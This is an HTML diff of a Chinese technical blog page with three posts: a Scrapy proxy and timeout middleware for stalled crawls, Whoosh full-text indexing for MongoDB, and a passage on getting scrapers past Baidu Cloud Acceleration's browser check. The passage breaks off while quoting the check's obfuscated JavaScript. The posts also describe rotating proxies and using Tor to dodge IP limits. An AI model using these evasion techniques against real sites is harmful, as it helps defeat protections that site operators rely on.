+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/scrapy-proxy/">解决Scrapy爬虫卡(停)顿问题</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;最近在做爬虫的时候经常遇到<code>爬虫卡顿（停顿）</code>的情况，让人很是苦恼，稍不注意就进程就卡住，在搜索了方法后，最后采用<code>自动代理切换+超时下载件</code>的方法解决。</p>
+<h3 id="编写自动代理中间件"><a href="#编写自动代理中间件" class="headerlink" title="编写自动代理中间件"></a>编写自动代理中间件</h3><p>&emsp;&emsp;在项目的<code>middlewares.py</code>中新建一个自动代理中间件的类，如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyproxyMiddleware</span><span class="hljs-params">(object)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""docstring for ProxyMiddleWare"""</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_request</span><span class="hljs-params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="hljs-string">'''对request对象加上proxy'''</span></span><br><span class="line">        <span class="hljs-comment"># proxy = self.get_random_proxy()</span></span><br><span class="line">        haha = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> haha &gt;= <span class="hljs-number">5</span>:</span><br><span class="line">            print(<span class="hljs-string">'\n随机&#123;&#125;正在使用代理\n'</span>.format(haha))</span><br><span class="line">            proxy = <span class="hljs-string">'http://127.0.0.1:8087'</span></span><br><span class="line">            request.meta[<span class="hljs-string">'proxy'</span>] = proxy</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_response</span><span class="hljs-params">(self, request, response, spider)</span>:</span></span><br><span class="line">        <span class="hljs-string">'''对返回的response处理'''</span></span><br><span class="line">        <span class="hljs-comment"># 如果返回的response状态不是200，重新生成当前request对象</span></span><br><span class="line">        <span class="hljs-keyword">if</span> response.status != <span class="hljs-number">200</span>:</span><br><span class="line">            proxy = <span class="hljs-string">'http://127.0.0.1:8087'</span></span><br><span class="line">            <span class="hljs-comment"># print("this is response ip:" + proxy)</span></span><br><span class="line">            <span class="hljs-comment"># 对当前reque加上代理</span></span><br><span class="line">            request.meta[<span class="hljs-string">'proxy'</span>] = proxy</span><br><span class="line">            <span class="hljs-keyword">return</span> request</span><br><span class="line">        <span class="hljs-keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_exception</span><span class="hljs-params">(self, request, exception, spider)</span>:</span></span><br><span class="line">        <span class="hljs-comment"># 出现异常时（超时）使用代理</span></span><br><span class="line">        print(<span class="hljs-string">"\n出现异常，正在使用代理重试....\n"</span>)</span><br><span class="line">        proxy = <span class="hljs-string">'http://127.0.0.1:8087'</span></span><br><span class="line">        request.meta[<span class="hljs-string">'proxy'</span>] = proxy</span><br><span class="line">        <span class="hljs-keyword">return</span> request</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>process_request()</code>方法是发起请求时调用的，所以如果你希望一开始请求就使用代理就可在这里写上代理地址，这个函数可以返回三个值：<code>None</code>、<code>request</code>、<code>response</code>。<br>如果是返回None，说明不对请求头做任何处理；如果返回request，则按照用户定制的请求头请求网页，如果我们要使用代理则需返回request，不写明写返回也是返回request；response表示不再使用其他下载中间件，直接返回响应结果。</p>
+<p>&emsp;&emsp;这里我使用随机的方法使用代理，毕竟代理流量也是有限度的。我使用的是<code>XX-NET</code>免费代理，它的主要用途是被国人拿来扶墙的，它提供自动IP切换服务，可以很好的为爬虫服务。另一种免费躲避IP限制的方法是使用<code>tor</code>，不过在国内的话需要先科学上网。</p>
+<p>&emsp;&emsp;<code>process_exception()</code>是对爬虫请求是出现的异常情况进行处理的方法，它会捕捉<code>超时、503</code>等异常，当我们出现卡顿或停顿时很有可能就是超时，所以我们要编写这个函数。当返回<code>request</code>时，爬虫会重新使用使用代理进行请求，我们需要的就是这个功能。</p>
+<h3 id="添加下载中间件"><a href="#添加下载中间件" class="headerlink" title="添加下载中间件"></a>添加下载中间件</h3><p>&emsp;&emsp;将上面的中间件添加到<code>setting.py</code>中，<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="hljs-string">'scrapy_first.middlewares.MyproxyMiddleware'</span>:<span class="hljs-number">200</span>,</span><br><span class="line">    <span class="hljs-string">'scrapy_first.middlewares.RandomUserAgent'</span>:<span class="hljs-number">158</span>,</span><br><span class="line">    <span class="hljs-string">'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware'</span>:<span class="hljs-number">500</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware</code>这个中间件可以定义超时时间，配合<code>DOWNLOAD_TIMEOUT = 200</code>使用。这也是防止爬虫停顿的方法。另一个跟这个功能差不多的是：<code>scrapy.contrib.downloadermiddleware.retry.RetryMiddleware</code>，有需要的也可以添加进去，它会把超时或者 HTTP 500 错误导致失败的页面记录下来，当爬虫爬取完正常的页面后再统一重新请求这些异常也页面。它有三个属性：</p>
+<ul>
+<li>RETRY_ENABLED</li>
+<li>RETRY_TIMES</li>
+<li>RETRY_HTTP_CODES</li>
+</ul>
+<p>&emsp;&emsp;各自的属性：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">RETRY_ENABLED</span><br><span class="line"></span><br><span class="line">新版功能。</span><br><span class="line"></span><br><span class="line">默认： True</span><br><span class="line"></span><br><span class="line">Retry Middleware 是否启用。</span><br><span class="line"></span><br><span class="line">RETRY_TIMES</span><br><span class="line"></span><br><span class="line">默认：2</span><br><span class="line"></span><br><span class="line">包括第一次下载，最多的重试次数</span><br><span class="line"></span><br><span class="line">RETRY_HTTP_CODES</span><br><span class="line"></span><br><span class="line">默认： [500, 502, 503, 504, 400, 408]</span><br><span class="line"></span><br><span class="line">重试的 response 返回值(code)。其他错误(DNS 查找问题、连接失败及其他)则一定会进行重试。</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;通过合理配置这些下载中间件就能很好的避免爬虫卡死的情况。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-17T09:57:00.000Z">2017-12-17</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    9 分钟 读完 (大约 1331 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/whoosh-mongo/">Whoosh使用及为Mongodb建立索引</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;由于作者的项目中需要为数据库建立索引以便以搜索，经过考察后还是决定使用<code>Whoosh+MongoDB</code>的方案。所以这篇文章是介绍怎样使用whoosh为mongodb建立索引，网上关于这方面的文章还是相对比较少的，所以有必要记录一下。</p>
+<p>&emsp;&emsp;whoosh是原生唯一的python写的<code>全文搜索引擎</code>，虽然说whoosh性能不一定比得上lucene,sphinx,xapian等,但由于是基于python，所以扩展性极好，非常容易集成到<code>django</code>或其他框架中，而且whoosh运行消耗的资源也比lucene等引擎少，加之作者的服务器性能较弱，数据量也还不大，就选择了<code>whoosh作为搜索引擎</code>。</p>
+<h3 id="架构方案"><a href="#架构方案" class="headerlink" title="架构方案"></a>架构方案</h3><p>&emsp;&emsp;作者使用的方案是：使用<code>jieba</code>为需要索引的whoosh的字段进行<code>中文分词</code>，搜索时，whoosh只返回<code>_id</code>字段的值，然后在mongodb中查找。当然，这个whoosh也可以把所有的字段都储存起来，这样就可以直接返回搜索结果，而省去在mongodb上查找的时间，但由此引发的一个问题就是索引文件过大，是空间利用问题，而且这样做就把whoosh当成了数据库角色。所以作者放弃了这一方案。</p>
+<h3 id="建立索引"><a href="#建立索引" class="headerlink" title="建立索引"></a>建立索引</h3><p>&emsp;&emsp;这里不介绍whoosh,mongodb的安装方法，请自行搜索。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh.fields <span class="hljs-keyword">import</span> Schema, TEXT, ID, DATETIME</span><br><span class="line"><span class="hljs-keyword">from</span> jieba.analyse <span class="hljs-keyword">import</span> ChineseAnalyzer</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> create_in, open_dir</span><br><span class="line"><span class="hljs-keyword">import</span> jieba</span><br><span class="line">jieba.load_userdict(<span class="hljs-string">"dict.txt"</span>)</span><br><span class="line"></span><br><span class="line">analyzer = ChineseAnalyzer()</span><br><span class="line"></span><br><span class="line">schema = Schema(</span><br><span class="line">            nid=ID(unique=<span class="hljs-keyword">True</span>, stored=<span class="hljs-keyword">True</span>),</span><br><span class="line">            url=ID(unique=<span class="hljs-keyword">True</span>, stored=<span class="hljs-keyword">False</span>),</span><br><span class="line">            date=DATETIME(unique=<span class="hljs-keyword">False</span>, stored=<span class="hljs-keyword">False</span>, sortable=<span class="hljs-keyword">True</span>),</span><br><span class="line">            title=TEXT(stored=<span class="hljs-keyword">False</span>, analyzer=analyzer),</span><br><span class="line">            content=TEXT(stored=<span class="hljs-keyword">False</span>, analyzer=analyzer)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">'D:/pythonCode/whoosh/index/'</span>):</span><br><span class="line">    os.mkdir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)</span><br><span class="line">    create_in(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>, schema)    <span class="hljs-comment"># 创建索引文件，需指定Schema</span></span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)    <span class="hljs-comment">#打开索引文件</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;因为whoosh是python实现的，所以很方便的就能跟结巴结合。而结巴允许的用户自定义字典，这对专业领域的分词很有帮助，我们只需要在<code>dict.txt</code>中存放专业名词就行。</p>
+<p>&emsp;&emsp;索引首先需要定义<code>Schema</code>，<code>stored</code>代表是否存储这个字段的值，<code>sortable</code>为是否可以排序，这里因为是时间，所以我选择True，<code>analyzer</code>分词器，这里我们使用结巴中文分词器。这里再啰嗦几句，ID的值为不可分割，所以适合url、id等一类不用分割查找的项；DATETIME为时间，不用解释；这里的<code>TEXT</code>才是我们需要<code>分词、建立索引</code>的项目。</p>
+<p>&emsp;&emsp;PPS：按照whoosh官方文档，对于简单的字段即使没有指定排序，但仍可以排序，只是结果可能不是那么完美。还有一种情况就是：如果你已经创建了Schema，并且写入数据，但是你想为某个字段排序，那么你可以使用：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh <span class="hljs-keyword">import</span> sorting</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> open_dir</span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> ix.writer() <span class="hljs-keyword">as</span> w:</span><br><span class="line">    sorting.add_sortable(w, <span class="hljs-string">"date"</span>, sorting.FieldFacet(<span class="hljs-string">"date"</span>))</span><br></pre></td></tr></table></figure></p>
+<h3 id="索引数据"><a href="#索引数据" class="headerlink" title="索引数据"></a>索引数据</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> create_in, open_dir</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(<span class="hljs-string">"xxx"</span>)</span><br><span class="line">db = client[<span class="hljs-string">'xxx'</span>]</span><br><span class="line">collections = db[<span class="hljs-string">'xxx'</span>]</span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)    <span class="hljs-comment">#打开索引文件</span></span><br><span class="line">_id = collections.insert(dict(item))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">with</span> ix.writer() <span class="hljs-keyword">as</span> writer:</span><br><span class="line">    writer.update_document(</span><br><span class="line">        nid=_id.__str__(),</span><br><span class="line">        url=item[<span class="hljs-string">'url'</span>],</span><br><span class="line">        title=item[<span class="hljs-string">'title'</span>],</span><br><span class="line">        date=datetime.strptime(item[<span class="hljs-string">'date'</span>], <span class="hljs-string">'%Y-%m-%d'</span>),   <span class="hljs-comment"># 字符串化成时间格式</span></span><br><span class="line">        content=item[<span class="hljs-string">'index_content'</span>]</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;在需要建立索引的地方使用如上代码。这里注意的一点是，mongodb插入数据返回的是ObjectId，如ObjectId(“5a2e2652c0bae92df4dd2372”)，而whoosh不支持存储ObjectId类型，所以我们需要的是括号里面的字符串，所以需要使用<code>_id.__str__()</code>提取。</p>
+<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>&emsp;&emsp;搜索代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> whoosh.index <span class="hljs-keyword">import</span> create_in, open_dir</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh.qparser <span class="hljs-keyword">import</span> MultifieldParser, QueryParser</span><br><span class="line"><span class="hljs-keyword">from</span> whoosh <span class="hljs-keyword">import</span> scoring, sorting</span><br><span class="line"><span class="hljs-keyword">from</span> bson.objectid <span class="hljs-keyword">import</span> ObjectId</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(<span class="hljs-string">"xxx"</span>)</span><br><span class="line">db = client[<span class="hljs-string">'xxx'</span>]</span><br><span class="line">collections = db[<span class="hljs-string">'xxx'</span>]</span><br><span class="line"></span><br><span class="line">ix = open_dir(<span class="hljs-string">"D:/pythonCode/whoosh/index/"</span>)    <span class="hljs-comment">#打开索引文件</span></span><br><span class="line"><span class="hljs-keyword">with</span> ix.searcher() <span class="hljs-keyword">as</span> searcher:</span><br><span class="line">    query = MultifieldParser([<span class="hljs-string">"title"</span>, <span class="hljs-string">"content"</span>], ix.schema).parse(<span class="hljs-string">"xss"</span>)</span><br><span class="line">    <span class="hljs-comment">#query = QueryParser("content", ix.schema).parse("xss")</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># 排序</span></span><br><span class="line">    mf = sorting.MultiFacet()</span><br><span class="line">    mf.add_field(<span class="hljs-string">"date"</span>, reverse=<span class="hljs-keyword">True</span>)</span><br><span class="line">    results = searcher.search(query, limit=<span class="hljs-number">10</span>, sortedby=mf)</span><br><span class="line">    print(len(results))</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> one <span class="hljs-keyword">in</span> results:</span><br><span class="line">        _id = ObjectId(one[<span class="hljs-string">'nid'</span>])      <span class="hljs-comment"># 将字符串构造成 ObjectId</span></span><br><span class="line">        res = collections.find(&#123;<span class="hljs-string">'_id'</span>:_id&#125;)[<span class="hljs-number">0</span>]</span><br><span class="line">        print(res[<span class="hljs-string">'date'</span>] + res[<span class="hljs-string">'title'</span>])</span><br><span class="line">        print(<span class="hljs-string">'-----------------------\n'</span>)</span><br><span class="line">        count += <span class="hljs-number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>MultifieldParser</code>是搜索多个field，也就是多个字段，而<code>QueryParser</code>只能搜索一个字段。<code>sorting.MultiFacet()</code>是whoosh中实现排序的一种方法，<code>reverse=True</code>是反向排序，这里实现的是时间降序。<code>searcher.search(sortedby=mf)</code>指定排序方式。其实whoosh里提供多种排序方法，功能还挺全面。</p>
+<p>&emsp;&emsp;这里提供了mongodb如何使用<code>_id</code>查找的方法。</p>
+<p>&emsp;&emsp;如果需要将<code>_id</code>中的值提取出来，则使用：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_id = collections.insert(dict(item))</span><br><span class="line">nid=_id.__str__()</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;如果需要使用字符串查找，则使用：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> bson.objectid <span class="hljs-keyword">import</span> ObjectId</span><br><span class="line"></span><br><span class="line">_id = ObjectId(one[<span class="hljs-string">'nid'</span>])      <span class="hljs-comment"># 将字符串构造成 ObjectId</span></span><br><span class="line">res = collections.find(&#123;<span class="hljs-string">'_id'</span>:_id&#125;)[<span class="hljs-number">0</span>]</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;完整的事例可查看<a href="https://github.com/DelCoding/MyCodes/blob/master/whoosh.py" target="_blank" rel="noopener">此页面</a></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-08T03:30:00.000Z">2017-12-08</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 736 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/scrapy-bypass/">一种爬虫绕过百度云加速检测的方法</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;&emsp;最近在做爬虫的时候遇到了百度云加速的浏览器安全检查，经过搜索后得到一种解决方法，现记录。</p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>&emsp;&emsp;遇到的检测网页是类似：xxx.com浏览器安全检查中…，如下：</p>
+<div align="center"><br>    <img src="/images/posts/other/12.jpg"><br></div>
+
+<p>&emsp;&emsp;这个网页检测的方法是让浏览器执行一段JS代码，将执行结果作为表单的值，跟其他隐藏值一起提交。这个网页的类似代码如下：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en-US"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Type"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"text/html; charset=UTF-8"</span> /&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"IE=Edge,chrome=1"</span> /&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"robots"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"noindex, nofollow"</span> /&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1, maximum-scale=1"</span> /&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>安全检查中...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-undefined">    html, body &#123;width: 100%; height: 100%; margin: 0; padding: 0;&#125;</span></span><br><span class="line"><span class="hljs-undefined">    body &#123;background-color: #ffffff; font-family: Helvetica, Arial, sans-serif; font-size: 100%;&#125;</span></span><br><span class="line"><span class="hljs-undefined">    h1 &#123;font-size: 1.5em; color: #404040; text-align: center;&#125;</span></span><br><span class="line"><span class="hljs-undefined">    p &#123;font-size: 1em; color: #404040; text-align: center; margin: 10px 0 0 0;&#125;</span></span><br><span class="line"><span class="hljs-undefined">    #spinner &#123;margin: 0 auto 30px auto; display: block;&#125;</span></span><br><span class="line"><span class="hljs-undefined">    .attribution &#123;margin-top: 20px;&#125;</span></span><br><span class="line"><span class="hljs-undefined">  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-comment">//&lt;![CDATA[</span></span></span><br><span class="line"><span class="hljs-javascript">  (<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> a = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">try</span>&#123;<span class="hljs-keyword">return</span> !!<span class="hljs-built_in">window</span>.addEventListener&#125; <span class="hljs-keyword">catch</span>(e) &#123;<span class="hljs-keyword">return</span> !<span class="hljs-number">1</span>&#125; &#125;,</span></span><br><span class="line"><span class="hljs-javascript">    b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">b, c</span>) </span>&#123;a() ? <span class="hljs-built_in">document</span>.addEventListener(<span class="hljs-string">"DOMContentLoaded"</span>, b, c) : <span class="hljs-built_in">document</span>.attachEvent(<span class="hljs-string">"onreadystatechange"</span>, b)&#125;;</span></span><br><span class="line"><span class="hljs-javascript">    b(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-keyword">var</span> a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'yjs-content'</span>);a.style.display = <span class="hljs-string">'block'</span>;</span></span><br><span class="line"><span class="hljs-javascript">      setTimeout(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> s,t,o,p,b,r,e,a,k,i,n,g,f, rmFZnZw=&#123;<span class="hljs-string">"zIAsbP"</span>:+((+!![]+[])+(+[]))&#125;;</span></span><br><span class="line"><span class="hljs-javascript">        t = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);</span></span><br><span class="line"><span class="hljs-xml">        t.innerHTML="<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'/'</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>";</span></span><br><span class="line"><span class="hljs-javascript">        t = t.firstChild.href;r = t.match(<span class="hljs-regexp">/https?:\/\//</span>)[<span class="hljs-number">0</span>];</span></span><br><span class="line"><span class="hljs-undefined">        t = t.substr(r.length); t = t.substr(0,t.length-1);</span></span><br><span class="line"><span class="hljs-javascript">        a = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'jschl-answer'</span>);</span></span><br><span class="line"><span class="hljs-javascript">        f = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'challenge-form'</span>);</span></span><br><span class="line"><span class="hljs-javascript">        